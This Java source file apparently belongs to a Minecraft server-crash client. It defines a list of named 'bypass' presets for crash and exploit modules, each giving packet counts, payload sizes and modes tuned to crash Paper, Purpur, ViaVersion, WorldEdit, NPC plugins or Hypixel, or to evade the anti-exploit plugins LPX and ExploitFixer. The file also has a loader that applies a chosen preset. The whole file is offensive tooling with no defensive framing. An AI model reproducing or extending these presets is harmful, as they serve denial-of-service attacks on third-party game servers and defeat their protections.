package us.whitedev.helpers;

import us.whitedev.utils.BypassListUtil;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ConfigHelper {
    public static final Map<String, String[]> loadedConfigs = new HashMap<>();
    private final List<BypassListUtil> bypassLists = List.of(
            new BypassListUtil("Crash Cipher1", "Paper", "Paper8MiB","packets[10], size[1], count[2097146]"),
            new BypassListUtil("Crash Cipher1", "Paper", "PaperBomb", "packets[500], count1[32000], count2[10]"),
            new BypassListUtil("Crash Cipher1", "LPX Latest", "LPX3513", "packets[1000], count1[2048], count2[11]"),
            new BypassListUtil("Crash Cipher1", "ViaVersion", "ViaComponentBomb1", "packets[1000], count1[5416], count2[1]"),
            new BypassListUtil("Crash Cipher1", "ViaBackwards", "ViaComponentBomb2", "packets[1000], count1[8000], count2[11]"),
            new BypassListUtil("Crash Echo1", "Paper Latest", "PaperFull","power[500], size[2096000], depth[1], type[Main2]"),
            new BypassListUtil("Crash Echo1", "Paper Latest", "PaperLarge","power[500], size[5000], depth[1000], type[Main1]"),
            new BypassListUtil("Crash Echo1", "Paper Latest", "PaperMedium","power[500], size[11000], depth[1], type[Netty1]"),
            new BypassListUtil("Crash Echo1", "Paper Latest", "PaperSmall","power[500], size[2500], depth[1], type[Netty2]"),
            new BypassListUtil("Crash Echo1", "ExploitFixer 2.7.x", "EF27x","power[2500], size[35000], depth[1], type[Main2]"),
            new BypassListUtil("Crash Echo1", "LPX 3.5.8", "LPX358","power[500], size[35000], depth[1], type[Main2]"),
            new BypassListUtil("Crash Spectre3", "ViaVersion OnePacket", "ViaOnePacket","packets[1], pages[6000], size[1], type[Convert]"),
            new BypassListUtil("Crash Spectre3", "LPX 3.5.x", "LPX35x","packets[20], pages[500], size[1], type[Convert]"),
            new BypassListUtil("Crash Onyx1", "Console Freezer", "Freezer","Packets[100], Mode[Comp], Size[1000]"),
            new BypassListUtil("Crash Onyx1", "ViaVersion (OLD)", "ViaVerNBT","Packets[1], Mode[Display], Size[1800]"),
            new BypassListUtil("Crash Onyx1", "LPX 3.5.4", "1LPX354","Packets[1], Mode[Map], Size[16000]"),
            new BypassListUtil("Crash Onyx1", "LPX 3.5.4", "2LPX354","Packets[1500], Mode[Comp], Size[2]"),
            new BypassListUtil("Crash Onyx1", "LPX 3.5.4 (1.20.5+)", "3LPX354","Packets[300], Mode[Comp], Size[1420]"),
            new BypassListUtil("Crash Onyx1", "LPX 3.5.4 (1.20.5+)", "4LPX354","Packets[500], Mode[Display], Size[50]"),
            new BypassListUtil("Crash Onyx2", "Paper/ViaVersion", "ViaPaper","Packets[700], Size[35000], Length[1]"),
            new BypassListUtil("Crash Vortex1", "ExploitFixer", "EF","packets[1], power[700], type[EF-Bypass]"),
            new BypassListUtil("Crash Vortex1", "ViaVersion 5.1.0", "ViaVer510","packets[1], power[700], type[Default]"),
            new BypassListUtil("Crash Vortex1", "Many Servers","ManyServer", "packets[500], power[1], type[Unreachable]"),
            new BypassListUtil("Crash Vortex2", "LPX 3.4.11", "LPX3411","packets[300], power[400], type[Boost]"),
            new BypassListUtil("Crash Vortex2", "ALL", "ALL","packets[100], power[700], type[Boost]"),
            new BypassListUtil("Crash Vortex2", "ViaVersion Latest", "ViaVerAll","packets[100], power[1000], type[Default]"),
            new BypassListUtil("Crash Vortex2", "LPX 3.5.3 (1.12)", "1LPX350","packets[400], power[480], type[Default]"),
            new BypassListUtil("Crash Vortex3", "LPX 3.5.3 (Newest)", "2LPX350","packets[500], size[20], length[300], type[Full]"),
            new BypassListUtil("Crash Vortex3", "LPX 3.5.3 (Newest)", "3LPX350","packets[500], size[38000], length[1], type[Empty]"),
            new BypassListUtil("Crash Vortex3", "LPX 3.5.2", "4LPX350","packets[260], size[3000], length[1], type[Empty]"),
            new BypassListUtil("Crash Shift1", "LPX 3.5.3", "5LPX350","packets[500], size[920], type[Default]"),
            new BypassListUtil("Crash Shift2", "ExploitFixer 3.1.0", "EF310","packets[1000], size[1], mode[deco]"),
            new BypassListUtil("Crash Strong1", "Paper/Purpur 1.21+", "Paper121", "packets[100], chars[100], pages[15], empty-stack[false], generator[Modern1], item[Saved], map-size[46], thread-sleep[1500], loop-amount[15]"),
            new BypassListUtil("Crash Strong1", "ExploitFixer 3.x (1.21+)", "EF3", "packets[100], chars[300], pages[25], empty-stack[true], generator[Modern1], item[Saved], map-size[46], thread-sleep[1500], loop-amount[15]"),
            new BypassListUtil("Crash Strong1", "LPX 3.3.5", "LPX335","packets[100], chars[1500], pages[15], empty-stack[false], generator[Default], item[Saved], map-size[46], thread-sleep[1500], loop-amount[10]"),
            new BypassListUtil("Crash Strong1", "Hypixel", "Hypixel","packets[300], chars[175], pages[1], empty-stack[false], generator[Boost1], item[Saved], thread-sleep[3000], loop-amount[10]"),
			new BypassListUtil("Crash Nova1", "ViaVersion 4.9.3", "ViaVer493","packets[500], pages[300000], size[1], mode[Legacy]"),
            new BypassListUtil("Crash Nova2", "LPX 3.5.0+ (Newest)", "6LPX350","packets[1500], size[17000], amount[30], scales[1], type[Saved], sleep[1], loops[1]"),
            new BypassListUtil("Crash Rogue1", "PacketsEvent-Old", "PEOld","packets[5000], invalidId[true], handException[false], clickException[false]"),
            new BypassListUtil("Crash Rogue1", "PacketsEvent-New", "PENew","packets[8000], invalidId[false], handException[false], clickException[true]"),
            new BypassListUtil("Crash Rogue2", "PaperSpigot 1.19/1.20", "PS1920","packets[500], tabException[false], buttonException[true], illegalPos[false], spigotException[false], slotException[false], recipeException[false]"),
            new BypassListUtil("Crash Rogue2", "PaperSpigot 1.13/1.20", "PS1320","packets[2], tabException[true], buttonException[false], illegalPos[false], spigotException[false], slotException[false], recipeException[false]"),
            new BypassListUtil("Crash Rogue2", "PaperSpigot 1.21.3", "PS1213","packets[2], tabException[true], buttonException[false], illegalPos[false], spigotException[false], slotException[false], recipeException[false]"),
            new BypassListUtil("Exploit PurpurExploit", "Purpur 1.19/1.20", "Purpur","power[1000], mode[Default]"),
            new BypassListUtil("Exploit WorldEditExploit", "WorldEdit Plugin", "WorldEdit","power[1000], mode[New]"),
            new BypassListUtil("Exploit SignExploit", "Spigot 1.8.9", "Spigot","mode[Crash]"),
            new BypassListUtil("Exploit EntityExploit", "NPC Plugin", "Entity","power[51000]")
    );

    public List<BypassListUtil> getBypassLists() {
        return bypassLists;
    }

    public boolean loadConfig(String name) {
        return bypassLists.stream()
                .filter(bypass -> bypass.bypassName().equalsIgnoreCase(name))
                .findFirst()
                .map(bypass -> {
                    loadedConfigs.put(
                            bypass.moduleName().split(" ")[1],
                            extractValues(bypass.configString())
                    );
                    return true;
                })
                .orElse(false);
    }

    private String[] extractValues(String input) {
        Pattern pattern = Pattern.compile("\\[(.*?)]");
        Matcher matcher = pattern.matcher(input);
        ArrayList<String> values = new ArrayList<>();

        while (matcher.find()) {
            values.add(matcher.group(1));
        }

        return values.toArray(new String[0]);
    }
}
